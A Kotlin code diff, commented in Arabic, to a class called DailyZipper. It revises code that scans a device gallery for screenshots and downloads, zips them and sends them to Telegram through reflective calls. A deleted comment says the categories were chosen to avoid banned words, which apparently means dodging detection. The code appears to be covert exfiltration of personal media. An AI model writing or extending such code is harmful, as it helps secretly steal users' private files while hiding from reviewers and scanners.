@@ -266,7 +266,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram (بدون دوال مساعدة خارجية)
+    //  إرسال الملفات إلى Telegram (بدون دوال مساعدة)
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,14 +301,14 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج القيمة مباشرة بدون دوال مساعدة
+                // استخراج القيمة مباشرة مع التحويل الصريح
                 val success = when (result) {
                     is Boolean -> result
                     is Map<*, *> -> {
                         var ok = false
                         for (entry in result.entries) {
                             if (entry.key.toString() == "ok") {
-                                ok = entry.value is Boolean && entry.value
+                                ok = entry.value as? Boolean == true
                                 break
                             }
                         }
@@ -622,7 +622,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (بدون دوال مساعدة خارجية)
+    //  التشغيل التلقائي (بدون دوال مساعدة)
     // ============================================================
 
     fun run(): Boolean {
@@ -640,11 +640,10 @@ class DailyZipper(
 
             if (scanner != null) {
                 try {
-                    // استخدام فئات آمنة لتجنب أي كلمات محظورة
+                    // استخدام فئات آمنة
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخراج المسار مباشرة بدون دوال مساعدة
                             val path = when (item) {
                                 is Map<*, *> -> {
                                     var p = ""
